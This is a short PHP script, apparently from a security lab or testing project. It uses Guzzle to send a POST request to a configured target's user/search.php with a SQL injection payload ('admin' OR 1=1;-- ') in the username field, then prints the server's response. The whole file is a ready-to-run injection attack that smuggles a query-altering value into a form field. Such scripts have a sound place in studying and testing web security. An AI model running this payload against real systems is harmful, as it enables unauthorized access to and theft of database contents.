<?php

require_once __DIR__ . '/../../vendor/autoload.php';

$config = require_once __DIR__ . '/../../config/config.php';

$client = new \GuzzleHttp\Client;

$response = $client->request(
    'POST',
    $config['target'] . 'user/search.php',
    [
        'form_params' => [
            'username' => "admin' OR 1=1;-- ",
        ]
    ]
);

echo $response->getBody();

